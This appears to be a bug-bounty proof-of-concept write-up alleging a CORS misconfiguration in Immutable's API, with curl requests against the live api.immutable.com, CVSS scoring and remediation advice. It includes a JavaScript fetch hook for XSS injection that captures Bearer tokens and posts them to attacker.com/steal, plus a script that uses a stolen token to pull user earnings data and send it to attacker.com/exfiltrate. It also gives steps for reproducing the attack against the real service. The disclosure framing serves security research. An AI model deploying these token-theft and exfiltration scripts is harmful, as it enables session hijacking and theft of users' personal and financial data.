🔓 Immutable CORS Vulnerability - Educational Proof of Concept

⚠️ This PoC demonstrates a REAL security vulnerability in Immutable's API infrastructure.
The attack chain is simulated for educational purposes and responsible disclosure.

📊 Proof 1: CORS Misconfiguration

All api.immutable.com endpoints allow requests from ANY origin:

$ curl -I "https://api.immutable.com/v2/rewards/earnings" -H "Origin: https://evil.com" HTTP/2 404 access-control-allow-origin: * access-control-expose-headers: * access-control-allow-headers: *,Authorization

Impact: Any website can make cross-origin requests to Immutable's authenticated API endpoints.

🎯 Proof 2: Sensitive User Data Exposure

The endpoint /v2/rewards/earnings returns personal user data including:

  • Quest completion history with timestamps
  • Gem rewards and financial information
  • Weekly lottery participation
  • User activity tracking IDs
# With a valid JWT token (obtained via login): $ curl "https://api.immutable.com/v2/rewards/earnings" \ -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjNhYVl5dGR3d2UwMzJzMXIzVElyOSJ9..." \ -H "Origin: https://evil.com" # Returns: User's personal earnings data (JSON array)

🔗 Complete Attack Chain Simulation

Step 1: Token Theft (via XSS)

An XSS vulnerability on play.immutable.com could automatically steal JWT tokens:

// Malicious script injected via XSS // Monitors all fetch requests for Authorization headers const originalFetch = window.fetch; window.fetch = function(...args) { const request = args[0]; const options = args[1] || {}; if (typeof request === 'string' && request.includes('api.immutable.com')) { const authHeader = options.headers?.Authorization; if (authHeader && authHeader.startsWith('Bearer ')) { // Send stolen token to attacker server fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify({token: authHeader}) }); } } return originalFetch.apply(this, args); };

Step 2: Cross-Origin Data Theft (via CORS)

With the stolen token, attacker can steal user data from ANY website:

// Attacker code on evil.com const stolenToken = 'BEARER_TOKEN_STOLEN_VIA_XSS'; fetch('https://api.immutable.com/v2/rewards/earnings', { headers: { 'Authorization': stolenToken, 'Origin': 'https://evil.com' // ← ALLOWED due to '*' } }) .then(response => response.json()) .then(userData => { // Stolen data: user's earnings, quests, gems, etc. console.log('Stolen user data:', userData); // Exfiltrate to attacker server fetch('https://attacker.com/exfiltrate', { method: 'POST', body: JSON.stringify(userData) }); });

🧪 Live Demonstration (Manual)

To demonstrate with real data:

  1. Login to play.immutable.com
  2. Open DevTools → Network tab → find Authorization: Bearer header
  3. Copy token value (without "Bearer ")
  4. Run this curl command:
curl "https://api.immutable.com/v2/rewards/earnings" \ -H "Authorization: Bearer PASTE_TOKEN_HERE" \ -H "Origin: https://evil.com"

Result: Your personal earnings data returned via cross-origin request.

📈 Impact Analysis

  • Confidentiality: High - Personal user financial data exposure
  • Attack Complexity: Medium - Requires token theft (XSS) + CORS exploitation
  • User Interaction: Required - Visit malicious site or XSS exploitation
  • CVSS 3.1 Score: 7.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)
  • Bounty Estimate: $3,000 - $10,000 (P2 High)

🛡️ Remediation Required

  1. Fix CORS: Remove access-control-allow-origin: * from authenticated endpoints
  2. Implement Origin Whitelisting: Allow only play.immutable.com, hub.immutable.com
  3. Add Proper Validation: Validate Origin header matches trusted domains
  4. Token Security: Implement HttpOnly cookies, short expiration times
  5. XSS Prevention: Regular security audits, Content Security Policy
